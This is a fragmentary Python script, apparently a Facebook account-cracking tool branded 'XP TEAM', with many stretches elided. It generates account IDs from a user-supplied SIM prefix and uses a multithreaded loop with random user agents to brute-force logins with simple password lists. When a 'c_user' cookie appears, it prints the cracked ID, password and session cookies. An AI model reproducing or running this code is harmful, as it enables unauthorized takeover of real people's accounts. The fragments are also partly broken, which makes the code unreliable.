...
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5558.207 Safari/537.36',]
logo=("""
...
\033[1;92m###    ### ########### ######### ###########                         
\033[1;97m--------------------------------------------------
\033[1;97m~! Owner    : Ali-XP
\033[1;97m~!  Facebook : Ozan Aly
\033[1;97m~!  Version  : 1
\033[1;97m~!  Team    : XP
\033[1;97m--------------------------------------------------""")
def linex():
...
def fia():    
			print(logo)
			print('\x1b[1;97m>>> XP TEAM  VERSION :\x1b[1;97m 1.1 ')
			linex()
			...
			if xd in ['1','01']:
				...
				os.system(f'xdg-open https://www.facebook.com/profile.php?id=100010399241489');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;97m[XIDI] %s|\033[1;97mOK:-%s \033[1;97m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in XIDI:
				print('\r\r\033[1;97m[XIDI-CP] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[XIDI-OK] '+ids+' | '+pas+'\033[1;92m')
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;97m[XIDI] %s|\033[1;32mOK:-%s \033[1;97m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;92m[XIDI-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[97;5;208m[XIDI-CP] '+ids+' | '+pas+'\033[1;97m')
...
def menu():
	...
	if opt =='1':
		...
		print('\n\033[1;97mChoose valid option\033[0;97m')
		menu()
#____
def random_number1():
	uid=[]
	...
	linex()
	kode = input('[+]\033[1;97m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		print('\x1b[1;97m[*] If You No Result Use Flight Mode ')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode]
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97m[XIDI]033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
    ...
    'x_fb_background_state': '1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[97;5;208m[XIDI-CP] '+cid+' | '+ps+'\033[1;97m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[XIDI-OK] '+cid+' | '+ps+'\33[0;92m')
